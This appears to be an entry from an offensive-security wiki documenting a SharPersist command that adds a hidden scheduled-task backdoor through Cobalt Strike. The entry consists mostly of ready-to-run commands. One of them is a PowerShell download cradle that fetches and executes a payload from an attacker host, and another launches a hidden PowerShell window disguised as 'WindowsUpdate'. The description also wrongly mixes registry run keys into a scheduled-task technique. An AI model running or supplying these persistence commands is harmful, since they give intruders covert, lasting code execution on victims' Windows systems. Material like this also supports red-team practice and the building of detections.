---
type: command
executor: powershell
data: >-
  SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c
  calc.exe" -n "Something Cool" -m add
tags:
  - persistence
  - creation
platforms:
  - Windows
verified: true
validated: true
---

# sharpersist-add-schtaskbackdoor-persistence

## Command

```powershell
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
```

## Description

Adds a hidden scheduled task persistence entry that executes at user logon, using registry run keys for stealthy execution in Cobalt Strike.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-t schtaskbackdoor` | Type: Hidden scheduled task backdoor | Yes |
| `-c <command>` | Executable path (e.g., cmd.exe) | Yes |
| `-a <args>` | Arguments to pass (e.g., /c payload) | Yes |
| `-n <name>` | Name for the persistence entry | Yes |
| `-m add` | Mode to add the entry | Yes |

## Examples

### Basic Usage

```powershell
SharPersist -t schtaskbackdoor -c "powershell.exe" -a "-c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')" -n "UpdateCheck" -m add
```

### Advanced Usage

```powershell
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -c ..." -n "WindowsUpdate" -m add
```

## Expected Output

Silent on success, or:
```
Persistence added successfully: Something Cool
```

Verify with [[commands/sharpersist-list-persistences]].

## Related

- [[procedures/Establish-Persistence-Using-SharPersist-in-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
